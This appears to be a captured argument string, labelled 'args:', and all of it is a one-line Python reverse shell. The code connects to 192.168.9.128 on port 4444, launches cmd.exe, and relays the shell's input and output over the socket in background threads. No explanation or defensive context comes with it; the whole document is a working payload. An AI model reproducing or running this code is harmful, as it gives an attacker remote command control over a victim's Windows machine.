args: import socket,subprocess,threading;s=socket.socket();s.connect(('192.168.9.128',4444));p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True);threading.Thread(target=lambda: [s.send(p.stdout.read(1)) for _ in iter(int,1)]).start();threading.Thread(target=lambda: [s.send(p.stderr.read(1)) for _ in iter(int,1)]).start();threading.Thread(target=lambda: [p.stdin.write(s.recv(1024)) for _ in iter(int,1)]).start()
